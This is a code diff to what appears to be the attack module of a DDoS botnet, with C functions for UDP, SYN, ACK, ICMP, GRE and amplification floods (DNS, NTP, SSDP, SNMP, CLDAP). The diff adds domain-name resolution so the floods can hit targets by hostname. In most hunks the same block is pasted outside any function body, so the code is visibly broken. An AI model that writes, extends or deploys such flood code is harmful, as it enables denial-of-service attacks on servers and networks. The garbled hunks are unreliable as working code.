@@ -120,6 +120,18 @@ static inline void rand_str_safe(char *str, int len) {
 
 void attack_udp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            /* Replace first target with resolved IP */
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) return;
 
@@ -150,6 +162,17 @@ void attack_udp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
 
 void attack_vse_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) return;
 
@@ -175,6 +198,17 @@ void attack_vse_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
 
 void attack_fivem_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                           int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) return;
 
@@ -328,6 +362,17 @@ void attack_http_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
 
 void attack_pps_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) return;
 
@@ -602,6 +647,17 @@ void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *ta
     resolv_entries_free(entries);
 }
 
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
 void attack_dns_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -631,6 +687,17 @@ void attack_dns_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *ta
     close(fd);
 }
 
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
 void attack_ntp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -657,6 +724,17 @@ void attack_ntp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *ta
 
     close(fd);
 }
+
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
 
 void attack_ssdp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
@@ -687,6 +765,17 @@ void attack_ssdp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *t
     close(fd);
 }
 
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
 void attack_snmp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -713,6 +802,17 @@ void attack_snmp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *t
 
     close(fd);
 }
+
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
 
 void attack_cldap_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
@@ -744,6 +844,17 @@ void attack_cldap_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
 /* =========================================================================
  * Layer 4 TCP Methods (ICMP, GRE)
  * ========================================================================= */
+
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
 
 void attack_icmp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
@@ -795,6 +906,17 @@ void attack_icmp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
 
     close(fd);
 }
+
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
 
 void attack_greip_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                         int targs_len, struct attack_option *opts, int opts_len) {
@@ -856,6 +978,17 @@ void attack_greip_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target
     close(fd);
 }
 
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
 void attack_greeth_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -911,6 +1044,17 @@ void attack_greeth_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_targe
 
 void attack_syn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (fd == -1) return;
 
@@ -957,6 +1101,17 @@ void attack_syn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
 
 void attack_ack_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (fd == -1) return;
 
@@ -1003,6 +1158,17 @@ void attack_ack_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
 
 void attack_fin_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (fd == -1) return;
 
@@ -1049,6 +1215,17 @@ void attack_fin_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
 
 void attack_rst_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (fd == -1) return;
 
@@ -1280,6 +1457,17 @@ void attack_cwr_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
  * New TCP Flood Methods (Useful Bypass Methods)
  * ========================================================================= */
 
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
 void attack_tcpconn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                           int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -1326,6 +1514,17 @@ void attack_tcpconn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_targ
     }
     close(fd);
 }
+
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
 
 void attack_xmas_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
@@ -1378,6 +1577,17 @@ void attack_xmas_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
     close(fd);
 }
 
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
+
 void attack_null_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -1423,6 +1633,17 @@ void attack_null_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
     }
     close(fd);
 }
+
+    /* Resolve domain via DNS if provided */
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    if (domain && util_strlen(domain) > 0) {
+        struct resolv_entries *entries = resolv_lookup(domain);
+        if (entries && entries->count > 0) {
+            targs[0].addr.s_addr = entries->addrs[0];
+            targs_len = 1;
+        }
+        resolv_entries_free(entries);
+    }
 
 void attack_window_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
